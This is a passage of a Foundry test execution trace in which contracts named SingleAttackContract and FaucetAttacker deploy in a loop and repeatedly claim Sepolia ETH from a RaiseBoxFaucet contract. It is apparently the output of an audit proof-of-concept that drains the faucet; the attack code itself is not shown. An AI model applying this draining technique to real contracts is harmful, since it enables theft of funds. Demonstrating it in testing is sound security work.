    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [546927] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [546168] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [510000] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [502342] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 575000000000000000 [5.75e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x90abB4F88E1795472fc80943f5f65181f56482ED
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 85) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [244958] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [244199] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [208031] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [200448] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 570000000000000000 [5.7e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [44899] → new SingleAttackContract@0x0b5E607562e92f644d63F467799b845932B6a309
